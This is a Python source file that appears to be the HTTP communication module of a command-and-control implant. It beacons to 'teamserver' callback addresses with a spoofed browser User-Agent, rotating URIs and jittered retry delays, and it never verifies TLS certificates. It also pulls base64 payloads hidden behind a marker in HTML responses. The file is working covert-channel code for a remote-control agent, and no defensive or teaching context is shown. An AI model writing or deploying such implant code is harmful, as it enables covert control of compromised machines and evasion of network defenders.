"""HTTP connector for the Python agent."""

import base64
import logging
import random

import aiohttp

logger = logging.getLogger(__name__)

_BACKOFF_BASE = 2.0
_BACKOFF_MAX = 300.0  # 5 minutes


class HTTPConnector:
    """Handles HTTP communication with the teamserver listener."""

    def __init__(self, config: dict):
        self.callback_addresses: list[str] = config["callback_addresses"]
        self.uris: list[str] = config["uris"]
        self.beat_header: str = config["beat_header"]
        self.http_method: str = config.get("http_method", "POST").upper()
        self.user_agent: str = config.get("user_agent", "Mozilla/5.0")
        self.extra_headers: dict = config.get("request_headers", {})
        self.ssl: bool = config.get("ssl", False)
        self._addr_index: int = 0
        self._fail_count: int = 0

    def _next_url(self) -> str:
        scheme = "https" if self.ssl else "http"
        addr = self.callback_addresses[self._addr_index % len(self.callback_addresses)]
        uri = random.choice(self.uris)
        self._addr_index += 1
        return f"{scheme}://{addr}{uri}"

    def _backoff(self) -> float:
        delay = min(_BACKOFF_BASE ** self._fail_count, _BACKOFF_MAX)
        return delay * (0.8 + 0.4 * random.random())  # ±20% jitter

    async def check_in(
        self,
        beat_header_value: str,
        body: bytes = b"",
    ) -> bytes | None:
        """POST to teamserver. Returns raw response body or None on failure."""
        url = self._next_url()
        headers = {
            "User-Agent": self.user_agent,
            self.beat_header: beat_header_value,
            **self.extra_headers,
        }
        connector = aiohttp.TCPConnector(ssl=False)
        try:
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.request(
                    self.http_method, url, data=body, headers=headers, timeout=aiohttp.ClientTimeout(total=30)
                ) as resp:
                    if resp.status == 200:
                        self._fail_count = 0
                        return await resp.read()
                    else:
                        logger.debug("Check-in got HTTP %d", resp.status)
                        self._fail_count += 1
                        return None
        except Exception as e:
            logger.debug("Check-in failed: %s", e)
            self._fail_count += 1
            return None

    def parse_payload(self, html_body: bytes) -> bytes | None:
        """Extract <<<PAYLOAD_DATA>>> from HTML response."""
        marker = b"<<<PAYLOAD_DATA>>>"
        start = html_body.find(marker)
        if start == -1:
            return None
        start += len(marker)
        # Find end of base64 content (up to < or whitespace)
        end = start
        while end < len(html_body) and html_body[end:end+1] not in (b"<", b" ", b"\n", b"\r"):
            end += 1
        b64_data = html_body[start:end].strip()
        if not b64_data:
            return None
        try:
            return base64.b64decode(b64_data)
        except Exception:
            return None
